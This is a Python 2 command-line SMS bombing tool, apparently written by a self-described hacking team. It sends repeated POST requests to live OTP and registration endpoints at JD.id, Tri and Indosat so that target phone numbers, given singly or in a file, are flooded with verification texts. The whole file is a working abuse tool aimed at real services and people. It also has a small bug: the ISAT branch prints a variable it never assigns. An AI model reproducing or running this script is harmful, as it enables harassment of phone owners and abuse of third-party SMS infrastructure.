try:
  from sys import argv,exit
  import requests,argparse
except ImportError,ie:
  print "Error while importing module %s, Exit."% ie


def bom(url,par,tot,indik):
  c=int(0)
  scs=int(0)
  fail=int(0)

  while ( c < int(tot) ):
    req = requests.post(url,data=par)
    
    if str(indik) in str(req.text):
      scs+=1
      
    else:
      fail+=1
      
    c+=1
  return {'sugmaball':scs,'fail':fail}
  

lCyan='\033[96m'
lGreen='\033[92m'
lRed='\033[91m'
lYellow='\033[93m'
white='\033[0m'

def ban():
  print """%s 
                        :####:
                       :######
                       ##:  :#
            %s  .####. %s  ##        ##.###:    :####    ## #:##:
            %s .######. %s ###:      #######:   ######   ########   
            %s ###  ### %s :#####:   ###  ###   #:  :##  ##.##.##   
            %s ##.  .## %s  .#####:  ##.  .##    :#####  ## ## ##   
            %s ##    ## %s     :###  ##    ##  .#######  ## ## ##   
            %s ##.  .## %s       ##  ##.  .##  ## .  ##  ## ## ##
            %s ###  ### %s #:.  :##  ###  ###  ##:  ###  ## ## ##
            %s .######. %s #######:  #######:  ########  ## ## ##
            %s  .####.  %s .#####:   ##.###:     ###.##  ## ## ##
                                 ##
              Author : [M]iZun0  ##  Team : BlackHole Security
              Github/sushiroku1  ##  Version : 1.0.0
              
                       
      %s"""% (lGreen,lRed,lGreen,lRed,lGreen,lRed,lGreen,lRed,lGreen,lRed,lGreen,lRed,lGreen,lRed,lGreen,lRed,lGreen,lRed,lGreen,white)

def aer(m):
  print "\t\t%sError : %s"% (lRed,m)
  print "\t\t%sTry : %s'%s -h'%s for information "% (white,lGreen,argv[0],white)
  exit()
pars= argparse.ArgumentParser(ban(),description="SMS SPAMMER",usage='[-h | --help | --list ] [--nomor NOMOR | --file FILE] [--tipe TIPE ] [ --jumlah JUMLAH ]',epilog="Example : %s --nomor 628xxx --tipe jdid --jumlah 3"% (argv[0]))
pars.error = aer
par=pars.add_argument_group('Single spam')
mul=pars.add_argument_group('Multi spam')
ops=pars.add_argument_group('Spam opt')
mul.add_argument('--file',default=None, help='File berisi list nomor yang akan di spam', type=argparse.FileType('r'))
#op=pars.add_mutually_exclusive_group()
par.add_argument('--nomor',default=None,type=str,help='Nomot target')
ops.add_argument('--jumlah',type=int,default=1,help='Jumlah sms yang akan dikirim, default 1')
pars.add_argument('--list',action='store_true',help='Print list spam yang ada.')

ops.add_argument('--tipe',type=str,help='Tipe spam, ketik "%s --list" untuk melihat tipe spam yang ada.'% argv[0])
arg=pars.parse_args()
try:
  dal= arg.file.read()
except:
  dal=None
numba = arg.nomor or dal
tot = int(arg.jumlah)
tip=str(arg.tipe).upper()
li=arg.list

if __name__=="__main__":
  
  if li == True:
    
    print '''
\t\t          List spam
            
\t\t    JDID        Semua operator
\t\t    TRI         Khusus SC Tri
\t\t    ISAT        Khusus SC Indosat
    
    '''
    exit()
  
  elif numba != None:
    for no in numba.split():
      
      slist={
    'JDID':{
        'url':'http://sc.jd.id/phone/sendPhoneSms',
        'par':{'phone':no,'smsType':'1'}
    },
    'TRI':{
        'url':'https://registrasi.tri.co.id/daftar/generateOTP?',
        'par':{'msisdn':no}
    },
    'ISAT':{
        'url':'https://myim3.indosatooredoo.com/registration/verifyMsisdn',
        'par':{'mobilephone':no}
    }
}
      for tipe,val in slist.items():
      
        if (tip,'JDID') == ('JDID',tipe):
          spam = bom(val['url'],val['par'],tot,'true')
          print '%s%s%s SMS sent to%s %s%s :%s %s %sSuccess%s and%s %s %sFail'% (lYellow,tot,lCyan,lYellow,no,lCyan,lYellow,spam['sugmaball'],lGreen,lCyan,lYellow,spam['fail'],lRed)
          
          
        elif (tip,'TRI') == ('TRI',tipe):
          spam = bom(val['url'],val['par'],tot,'success')
          print '%s%s%s SMS sent to%s %s%s :%s %s %sSuccess%s and%s %s %sFail'% (lYellow,tot,lCyan,lYellow,no,lCyan,lYellow,spam['sugmaball'],lGreen,lCyan,lYellow,spam['fail'],lRed)
          
        
        elif (tip,'ISAT') == ('ISAT',tipe):
          span = bom(val['url'],val['par'],tot,'Kami telah mengirimkan kode verifikasi')
          print '%s%s%s SMS sent to%s %s%s :%s %s %sSuccess%s and%s %s %sFail'% (lYellow,tot,lCyan,lYellow,no,lCyan,lYellow,spam['sugmaball'],lGreen,lCyan,lYellow,spam['fail'],lRed)
          
        
        elif str(tip) not in slist.keys():
        
          aer('Tipe spam "%s" tidak ada'% tip)
          exit()
        